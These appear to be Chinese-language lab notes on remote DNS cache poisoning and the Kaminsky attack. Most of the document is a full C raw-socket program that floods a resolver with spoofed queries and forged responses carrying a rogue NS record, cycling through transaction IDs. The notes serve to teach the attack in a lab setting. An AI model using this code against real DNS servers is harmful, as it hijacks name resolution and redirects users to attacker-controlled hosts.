# 远程DNS缓存中毒攻击

本地DNS缓存中毒攻击有一定的局限性，必须在同一个局域网中。而远程攻击嗅探不到DNS请求。  
DNS请求中有两个数据远程攻击者很难获得：  
1、UDP头部的源端口号  
DNS请求通过UDP数据包发送，源端口号是16比特的随机数字  

2、DNS头部16比特的交易ID  

!!! Note

    一个欺骗回复必须包含这两个值，否则回复不会被接受。远程攻击者只能猜测这两个值，猜到
    的概率为2的32次方，如果1秒内发1000个请求，则需要50天。如果用1000个主机的僵尸网络
    发起攻击，则需要1.2小时

而实际由于缓存的因素，DNS服务器不会对同一主机发起第二次请求，除非缓存内的结果过期。缓存的这个特点
使得攻击在尝试第二次攻击前需要等待，这使得远程DNS中毒攻击变得不现实。

## Kaminsky攻击

为了对远程计算机发动欺骗攻击，需要完成三个任务：  
1、触发目标服务器发送DNS请求  
2、发送欺骗回复  
3、使缓存失效  
前两个任务很简单，难度比较大的是第三个，这一直是一个悬而未解的问题，直到Dan Kaminsky提出了一个巧妙的解决
方案，通过他的方案，攻击者可以持续地发起欺骗攻击，而不需要等待。

他的思路不是让缓存失效，而是去修改域名服务器的上一级权威域名服务器。用一个随机的二级域名向远程DNS服务器发请求，
在上一级权威域名服务器回复消息前，伪造消息给远程域名服务器，带上NS记录，如果猜错则继续用随机二级域名重试。  

```c
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>

// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

// The IP header's structure
struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

// UDP header's structure
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;

};
struct dnsheader {
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};
// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd{
    unsigned short int  type;
    unsigned short int  class;
};
// total udp header length: 8 bytes (=64 bits)

// dns response packet
struct dnsresponse {
    unsigned short int transaction_id;
    unsigned short int flags;
    unsigned short int QDCOUNT; // number of questions in the response
    unsigned short int ANCOUNT; // number of answer RRs in the response
    unsigned short int NSCOUNT; // ??
    unsigned short int ARCOUNT; // number of authority RRs in the response
};

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum=0;
    for(;isize>1;isize-=2){
        cksum+=*usBuff++;
    }
    if(isize==1){
        cksum+=*(uint16_t *)usBuff;
    }
    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
    struct ipheader *tempI=(struct ipheader *)(buffer);
    struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
    struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
    tempH->udph_chksum=0;
    sum=checksum((uint16_t *)&(tempI->iph_sourceip),8);
    sum+=checksum((uint16_t *)tempH,len);
    sum+=ntohs(IPPROTO_UDP+len);
    sum=(sum>>16)+(sum & 0x0000ffff);
    sum+=(sum>>16);
    return (uint16_t)(~sum);
}
// Function for checksum calculation. From the RFC791,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char *argv[])
{
    // socket descriptor
    int sd;
    int sd_response;

    char *DNS_SERVER_IP = "192.168.230.154";
    char *ATTACKER_MACHINE_IP = "192.168.230.156";
    char *EXAMPLE_EDU_NS_SERVER1_IP = "199.43.135.53";
    char *EXAMPLE_EDU_NS_SERVER2_IP = "199.43.133.53";

    // buffer to hold the packet
    char buffer[PCKT_LEN];
    char res_buffer[PCKT_LEN];

    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);
    memset(res_buffer,0,PCKT_LEN);

    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*)(buffer +sizeof(struct ipheader)+
        sizeof(struct udpheader));

    struct ipheader *ip_res = (struct ipheader *)res_buffer;
    struct udpheader *udp_res = (struct udpheader *)(res_buffer + 
        sizeof(struct ipheader));
    struct dnsheader *dns_res =(struct dnsheader*)(res_buffer +
        sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload  
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+
        sizeof(struct dnsheader));
    char *res_data=(res_buffer +sizeof(struct ipheader)+sizeof(struct udpheader)
        +sizeof(struct dnsheader));

    //The flag you need to set
    dns->flags=htons(FLAG_Q);
    dns_res->flags=htons(FLAG_R);
    
    //only 1 query, so the count should be one.
    dns->QDCOUNT=htons(1);

    dns_res->QDCOUNT=htons(1);
    dns_res->ANCOUNT=htons(1);
    dns_res->NSCOUNT=htons(1);
    dns_res->ARCOUNT=htons(1);

    //query string
    strcpy(data,"\5aaaaa\7example\3edu");
    int length= strlen(data)+1;
    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);

    strcpy(res_data,"\5aaaaa\7example\3edu");
    int res_length= strlen(res_data)+1;
    struct dataEnd * end_res=(struct dataEnd *)(res_data + res_length);
    end_res->type=htons(1);
    end_res->class=htons(1);

    int offset = sizeof(struct ipheader) + sizeof(struct udpheader) + 
        sizeof(struct dnsheader) + res_length + sizeof(struct dataEnd);

    // making the dns response packet
    // answer session
    res_buffer[offset] = 0xc0;

    res_buffer[offset+1] = 0x0c;

    res_buffer[offset+2] = 0x00;
    res_buffer[offset+3] = 0x01;

    res_buffer[offset+4] = 0x00;
    res_buffer[offset+5] = 0x01;

    res_buffer[offset+6] = 0x02;
    res_buffer[offset+7] = 0x00;
    res_buffer[offset+8] = 0x00;
    res_buffer[offset+9] = 0x00;

    res_buffer[offset+10] = 0x00;
    res_buffer[offset+11] = 0x04;

    res_buffer[offset+12] = 0x01;
    res_buffer[offset+13] = 0x01;
    res_buffer[offset+14] = 0x01;
    res_buffer[offset+15] = 0x01;
    // authoritative nameservers session
    res_buffer[offset+16] = 0xc0;    

    res_buffer[offset+17] = 0x12;

    res_buffer[offset+18] = 0x00;
    res_buffer[offset+19] = 0x02;

    res_buffer[offset+20] = 0x00;
    res_buffer[offset+21] = 0x01;

    res_buffer[offset+22] = 0x02;
    res_buffer[offset+23] = 0x00;
    res_buffer[offset+24] = 0x00;
    res_buffer[offset+25] = 0x00;

    res_buffer[offset+26] = 0x00;
    res_buffer[offset+27] = 0x17;

    res_buffer[offset+28] = 0x02;

    res_buffer[offset+29] = 0x6e;

    res_buffer[offset+30] = 0x73;

    res_buffer[offset+31] = 0x0e;

    res_buffer[offset+32] = 0x64;

    res_buffer[offset+33] = 0x6e;

    res_buffer[offset+34] = 0x73;

    res_buffer[offset+35] = 0x6c;

    res_buffer[offset+36] = 0x61;

    res_buffer[offset+37] = 0x62;

    res_buffer[offset+38] = 0x61;

    res_buffer[offset+39] = 0x74;

    res_buffer[offset+40] = 0x74;

    res_buffer[offset+41] = 0x61;

    res_buffer[offset+42] = 0x63;

    res_buffer[offset+43] = 0x6b;

    res_buffer[offset+44] = 0x65;

    res_buffer[offset+45] = 0x72;

    res_buffer[offset+46] = 0x03;

    res_buffer[offset+47] = 0x6e;

    res_buffer[offset+48] = 0x65;

    res_buffer[offset+49] = 0x74;

    res_buffer[offset+50] = 0x00;

    res_buffer[offset+51] = 0x02;    

    res_buffer[offset+52] = 0x6e;

    res_buffer[offset+53] = 0x73;

    res_buffer[offset+54] = 0x0e;

    res_buffer[offset+55] = 0x64;

    res_buffer[offset+56] = 0x6e;

    res_buffer[offset+57] = 0x73;

    res_buffer[offset+58] = 0x6c;

    res_buffer[offset+59] = 0x61;

    res_buffer[offset+60] = 0x62;

    res_buffer[offset+61] = 0x61;

    res_buffer[offset+62] = 0x74;

    res_buffer[offset+63] = 0x74;

    res_buffer[offset+64] = 0x61;

    res_buffer[offset+65] = 0x63;

    res_buffer[offset+66] = 0x6b;

    res_buffer[offset+67] = 0x65;

    res_buffer[offset+68] = 0x72;

    res_buffer[offset+69] = 0x03;

    res_buffer[offset+70] = 0x6e;

    res_buffer[offset+71] = 0x65;

    res_buffer[offset+72] = 0x74;

    res_buffer[offset+73] = 0x00;

    res_buffer[offset+74] = 0x00;
    res_buffer[offset+75] = 0x01;

    res_buffer[offset+76] = 0x00;
    res_buffer[offset+77] = 0x01;

    res_buffer[offset+78] = 0x02;
    res_buffer[offset+79] = 0x00;
    res_buffer[offset+80] = 0x00;
    res_buffer[offset+81] = 0x00;

    res_buffer[offset+82] = 0x00;
    res_buffer[offset+83] = 0x04;

    res_buffer[offset+84] = 0x01;
    res_buffer[offset+85] = 0x01;
    res_buffer[offset+86] = 0x01;
    res_buffer[offset+87] = 0x01;

    res_buffer[offset+88] = 0x00;
    res_buffer[offset+89] = 0x00;
    res_buffer[offset+90] = 0x29;
    res_buffer[offset+91] = 0x10;
    res_buffer[offset+92] = 0x00;
    res_buffer[offset+93] = 0x00;
    res_buffer[offset+94] = 0x00;
    res_buffer[offset+95] = 0x88;
    res_buffer[offset+96] = 0x00;
    res_buffer[offset+97] = 0x00;
    res_buffer[offset+98] = 0x00;

    // Source and destination addresses: IP and port
    struct sockaddr_in sin, din;
    struct sockaddr_in sin_res, din_res;
    int one = 1;
    const int *val = &one;
    dns->query_id=rand(); // transaction ID for the query packet, use random #

    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    sd_response = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0) // if socket fails to be created 
        printf("socket error\n");
    if(sd_response<0) // if socket fails to be created 
        printf("sd_response socket error\n");

    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin_res.sin_family = AF_INET;
    din_res.sin_family = AF_INET;

    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);
    
    sin_res.sin_port = htons(53); 
    din_res.sin_port = htons(33333);

    // IP addresses
    sin.sin_addr.s_addr = inet_addr(DNS_SERVER_IP); 
    din.sin_addr.s_addr = inet_addr(ATTACKER_MACHINE_IP); 

    sin_res.sin_addr.s_addr = inet_addr(DNS_SERVER_IP);
    din_res.sin_addr.s_addr = inet_addr(EXAMPLE_EDU_NS_SERVER2_IP);

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay
    ip_res->iph_ihl = 5;
    ip_res->iph_ver = 4;
    ip_res->iph_tos = 0; // Low delay

    unsigned short int packetLength =(sizeof(struct ipheader) +
        sizeof(struct udpheader)+sizeof(struct dnsheader)+length+
        sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size

    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP

    unsigned short int packetLength_res =(sizeof(struct ipheader) +
        sizeof(struct udpheader)+sizeof(struct dnsheader)+res_length+
        sizeof(struct dataEnd)+99); // length + dataEnd_size == UDP_payload_size

    ip_res->iph_len=htons(packetLength_res);
    ip_res->iph_ident = htons(rand()); // give a random number for the identification#
    ip_res->iph_ttl = 110; // hops
    ip_res->iph_protocol = 17; // UDP

    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(ATTACKER_MACHINE_IP);
    ip_res->iph_sourceip = inet_addr(EXAMPLE_EDU_NS_SERVER2_IP);

    // The destination IP address
    ip->iph_destip = inet_addr(DNS_SERVER_IP);
    ip_res->iph_destip = inet_addr(DNS_SERVER_IP);

    // Fabricate the UDP header. Source port number, redundant
    udp->udph_srcport = htons(33333);  // source port number. remember the lower number may be reserved
    udp_res->udph_srcport = htons(53);  // source port number. remember the lower number may be reserved
    
    // Destination port number
    udp->udph_destport = htons(53);
    udp_res->udph_destport = htons(33333); 

    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+
        length+sizeof(struct dataEnd));
    udp_res->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+
        length+sizeof(struct dataEnd)+99); 

    // Calculate the checksum for integrity
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + 
        sizeof(struct udpheader));
    ip_res->iph_chksum = csum((unsigned short *)res_buffer, sizeof(struct ipheader) +
        sizeof(struct udpheader));

    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    udp_res->udph_chksum=check_udp_sum(res_buffer, 
        packetLength_res-sizeof(struct ipheader));    
    
    // Inform the kernel to not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 ) {
        printf("error\n");  
        exit(-1);
    }
    if(setsockopt(sd_response, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 ) {
        printf("error\n");  
        exit(-1);
    }

    int j=1;
    int cnt; 
    int tID; 
    while (j) {  
        cnt= 0; 
        tID = 3500;
        // This is to generate a different query in xxxxx.example.edu
        //   NOTE: this will have to be updated to only include printable characters
        int charnumber;
        charnumber=1+rand()%5;
        *(data+charnumber)+=1;
        *(res_data+charnumber)+=1;

        udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

        // send the packet out.
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n",errno,strerror(errno));

        // add sleep
        sleep(0.5);

        for (;cnt<150;cnt++) {
            dns_res->query_id=tID+cnt;
            udp_res->udph_chksum=check_udp_sum(res_buffer, 
                packetLength_res-sizeof(struct ipheader));
            if (sendto(sd_response,res_buffer,packetLength_res,0,(struct sockaddr *)&sin_res, sizeof(sin_res)) < 0)
                printf("packet send error %d which means %s\n",errno,strerror(errno));
        }
    }
    close(sd);
    close(sd_response);
    printf("--- Done ---\n");
    return 0;
}
/* wireshark filters
dns and (ip.dst==199.43.133.53 or ip.dst==199.43.135.53)
dns and dns.id==0x9e27
*/
```

!!! 实验经验

    被攻击的DNS服务器不会使用回复中提供的IP地址，而是会发出一个新的请求亲自查询ns.attacker32.com的真实ip地址，
    攻击者必须真正拥有attacker32.com这个域名才有机会回应这个请求，并提供他们选择的IP地址